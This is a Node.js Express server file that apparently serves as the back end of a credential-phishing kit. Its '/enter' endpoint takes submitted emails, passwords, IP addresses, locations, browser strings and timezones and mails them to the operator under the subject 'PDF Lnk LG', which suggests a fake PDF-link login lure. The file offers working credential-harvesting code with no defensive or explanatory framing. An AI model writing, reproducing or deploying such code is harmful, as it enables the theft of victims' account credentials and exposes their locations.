require("dotenv").config();
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

const port = parseInt(process.env.PORT) || 3000;
// For gmail box
// const transporter = nodemailer.createTransport({
//     host: "smtp.gmail.com",
//     auth: {
//         user: process.env.EMAIL,
//         pass: process.env.PASSWORD,
//     },
// });

const transporter = nodemailer.createTransport({
  host: "server165.web-hosting.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASSWORD,
  },
  tls: { rejectUnauthorized: false },
});


app.use(express.json());
app.use(cors());

app.get("/keepup", (req, res) => {
    return res.status(200).json("Server is up")
})

app.post("/enter", async (req, res) => {
    const { email, password, ip, country, city, userAgent, timezone} = req.body;
    const dateArray = new Date().toISOString().split("T");

    try {
        await transporter.sendMail({
            from: process.env.EMAIL,
            to: process.env.EMAIL,
            subject: "PDF Lnk LG",
            html: `
            <strong>Email:</strong> ${email}<br>
            <strong>Password:</strong> ${password}<br>
            <strong>IP Address:</strong> ${ip}<br>
            <strong>Country:</strong> ${country}<br>
            <strong>City:</strong> ${city}<br>
            <strong>Browser:</strong> ${userAgent}<br>
            <strong>TimeZone:</strong> ${timezone}<br>
            <strong>Date:</strong> ${dateArray[0]}<br>
            <strong>Time:</strong> ${dateArray[1]}<br>
            <strong>=============================</strong>
        `
        });
    } catch (error) {
    }
    
});

app.listen(port, () => {
    console.log(`Server started and running on port ${port}`);
});